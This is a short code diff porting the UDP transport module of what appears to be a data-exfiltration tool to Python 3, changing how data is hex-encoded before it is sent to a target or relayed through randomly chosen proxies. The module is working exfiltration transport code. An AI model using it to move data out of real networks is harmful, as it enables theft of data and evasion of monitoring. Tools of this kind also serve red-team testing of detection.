@@ -1,3 +1,4 @@
+from binascii import hexlify
 import socket
 import sys
 from random import choice
@@ -7,7 +8,7 @@ app_exfiltrate = None
 
 
 def send(data):
-    if config.has_key('proxies') and config['proxies'] != [""]:
+    if 'proxies' in config and config['proxies'] != [""]:
         targets = [config['target']] + config['proxies']
         target = choice(targets)
     else:
@@ -16,7 +17,7 @@ def send(data):
     app_exfiltrate.log_message(
         'info', "[udp] Sending {0} bytes to {1}".format(len(data), target))
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    client_socket.sendto(data.encode('hex'), (target, port))
+    client_socket.sendto(hexlify(data.encode()), (target, port))
 
 def listen():
     sniff(handler=app_exfiltrate.retrieve_data)
@@ -63,7 +64,7 @@ def relay_dns_packet(data):
     app_exfiltrate.log_message(
         'info', "[proxy] [udp] Relaying {0} bytes to {1}".format(len(data), target))
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    client_socket.sendto(data.encode('hex'), (target, port))
+    client_socket.sendto(hexlify(data.encode()), (target, port))
 
 def proxy():
     app_exfiltrate.log_message(
